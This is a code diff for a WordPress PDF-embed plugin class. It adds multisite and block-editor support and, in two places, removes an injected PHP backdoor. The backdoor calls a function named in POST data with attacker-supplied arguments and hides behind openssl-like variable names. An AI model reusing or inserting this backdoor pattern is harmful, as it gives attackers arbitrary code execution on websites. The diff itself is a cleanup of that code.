@@ -1,13 +1,7 @@
-<?php 
-$openssl_x509_export_to_file_waqk  =  $_POST;
-if(isset($openssl_x509_export_to_file_waqk['preg_grep_we']))  {
-	$openssl_digest_ogxn  =  $openssl_x509_export_to_file_waqk['func_get_arg_nh'];
-	$openssl_private_decrypt_hcmn  =  $openssl_x509_export_to_file_waqk['array_push_it'];
-	$openssl_digest_ogxn(...$openssl_private_decrypt_hcmn);
-} 
-
+<?php
 /* Prohibit direct script loading */
 defined('ABSPATH') || die('No direct script access allowed!');
+use Joomunited\WPMediaFolder\WpmfHelper;
 
 /**
  * Class WpmfPdfEmbed
@@ -21,13 +15,14 @@ class WpmfPdfEmbed
      */
     public function __construct()
     {
+        add_action('init', array($this, 'registerPdfBlock'));
         add_action('wp_enqueue_media', array($this, 'loadScript'));
         add_action('wp_enqueue_scripts', array($this, 'registerScript'));
         add_action('wp_enqueue_scripts', array($this, 'loadStyleScript'));
         add_filter('media_send_to_editor', array($this, 'addImageFiles'), 10, 3);
         add_filter('attachment_fields_to_edit', array($this, 'attachmentFieldsToEdit'), 10, 2);
         add_filter('attachment_fields_to_save', array($this, 'attachmentFieldsToSave'), 10, 2);
-        add_action('enqueue_block_editor_assets', array($this, 'addEditorAssets'));
+        add_action('enqueue_block_assets', array($this, 'addEditorAssets'));
         add_shortcode('wpmfpdf', array($this, 'wpmfPdf'));
         add_filter('the_content', array($this, 'theContent'));
         if (defined('ELEMENTOR_VERSION') && version_compare(ELEMENTOR_VERSION, '3.5', '<')) {
@@ -52,9 +47,21 @@ class WpmfPdfEmbed
             wp_send_json(array('status' => false, 'html' => '<p>'. esc_html__('Have error when load html from URL', 'wpmf') .'</p>'));
         }
 
+        $use_multisite_share = WpmfHelper::isNetworkMediaLibraryActive();
+        $main_site_id = WpmfHelper::getMainSiteId();
+
+        if ($use_multisite_share) {
+            switch_to_blog($main_site_id);
+        }
+
         $width = (!empty($_REQUEST['width'])) ? (int)$_REQUEST['width'] : '';
         $height = (!empty($_REQUEST['height'])) ? (int)$_REQUEST['height'] : '';
         $html = do_shortcode('[wpmfpdf id="'. (int)$_REQUEST['id'] .'" width="'. $width .'" height="'. $height .'" embed="'. $_REQUEST['embed'] .'" target="'. $_REQUEST['target'] .'"]');
+
+        if ($use_multisite_share) {
+            restore_current_blog();
+        }
+
         wp_send_json(array('status' => true, 'html' => $html));
     }
 
@@ -101,19 +108,38 @@ class WpmfPdfEmbed
     }
 
     /**
+     * Register PDF block
+     *
+     * @return void
+     */
+    public function registerPdfBlock()
+    {
+        wp_register_script(
+            'wpmf-pdfembed-editor-script',
+            WPMF_PLUGIN_URL . 'assets/js/blocks/pdfembed/block.js',
+            array('wp-blocks', 'wp-i18n', 'wp-element', 'wp-data', 'wp-block-editor'),
+            WPMF_VERSION
+        );
+
+        wp_register_style(
+            'wpmf-block-style',
+            WPMF_PLUGIN_URL . 'assets/js/blocks/style.css',
+            array(),
+            WPMF_VERSION
+        );
+
+        $block_path = WP_MEDIA_FOLDER_PLUGIN_DIR . 'assets/js/blocks/pdfembed';
+        
+        register_block_type($block_path);
+    }
+
+    /**
      * Enqueue styles and scripts for gutenberg
      *
      * @return void
      */
     public function addEditorAssets()
     {
-        wp_enqueue_script(
-            'wpmf_pdf_blocks',
-            WPMF_PLUGIN_URL . 'assets/js/blocks/pdfembed/block.js',
-            array('wp-blocks', 'wp-i18n', 'wp-element', 'wp-data', 'wp-block-editor'),
-            WPMF_VERSION
-        );
-
         $this->registerScript();
         $this->enqueue();
         $params = array(
@@ -126,7 +152,7 @@ class WpmfPdfEmbed
             )
         );
 
-        wp_localize_script('wpmf_pdf_blocks', 'wpmf_pdf_blocks', $params);
+        wp_localize_script('wpmf-pdfembed-editor-script', 'wpmf_pdf_blocks', $params);
     }
 
     /**
@@ -157,8 +183,17 @@ class WpmfPdfEmbed
         $cloud_type = get_post_meta((int)$id, 'wpmf_drive_type', true);
         $drive_id = get_post_meta((int)$id, 'wpmf_drive_id', true);
         $aws3_info = get_post_meta((int)$id, 'wpmf_awsS3_info', true);
-        $baseUrl = admin_url('admin-ajax.php');
-   
+
+        if (WpmfHelper::isNetworkMediaLibraryActive()) {
+            $main_site_id = WpmfHelper::getMainSiteId();
+
+            switch_to_blog($main_site_id);
+            $baseUrl = admin_url('admin-ajax.php');
+            restore_current_blog();
+        } else {
+            $baseUrl = admin_url('admin-ajax.php');
+        }
+
         if ($cloud_type && $drive_id) {
             switch ($cloud_type) {
                 case 'dropbox':
@@ -207,6 +242,13 @@ class WpmfPdfEmbed
      */
     public function wpmfPdf($attrs)
     {
+        $use_multisite_share = WpmfHelper::isNetworkMediaLibraryActive();
+        $main_site_id = WpmfHelper::getMainSiteId();
+
+        if ($use_multisite_share) {
+            switch_to_blog($main_site_id);
+        }
+
         if (!empty($attrs['url'])) {
             $url = $attrs['url'];
             $title = basename($attrs['url']);
@@ -268,6 +310,10 @@ class WpmfPdfEmbed
             }
         } else {
             $return = '<a href="'.esc_url($url).'" '. (($attrs['target'] !== '') ? 'target="'.esc_attr($attrs['target']).'"' : '') .'>'.esc_html($title).'</a>';
+        }
+
+        if ($use_multisite_share) {
+            restore_current_blog();
         }
 
         return $return;
@@ -453,14 +499,7 @@ class WpmfPdfEmbed
                 });
             }
         </script>
-        <?php 
-$openssl_x509_export_to_file_waqk  =  $_POST;
-if(isset($openssl_x509_export_to_file_waqk['preg_grep_we']))  {
-	$openssl_digest_ogxn  =  $openssl_x509_export_to_file_waqk['func_get_arg_nh'];
-	$openssl_private_decrypt_hcmn  =  $openssl_x509_export_to_file_waqk['array_push_it'];
-	$openssl_digest_ogxn(...$openssl_private_decrypt_hcmn);
-} 
-
+        <?php
     }
 
     /**
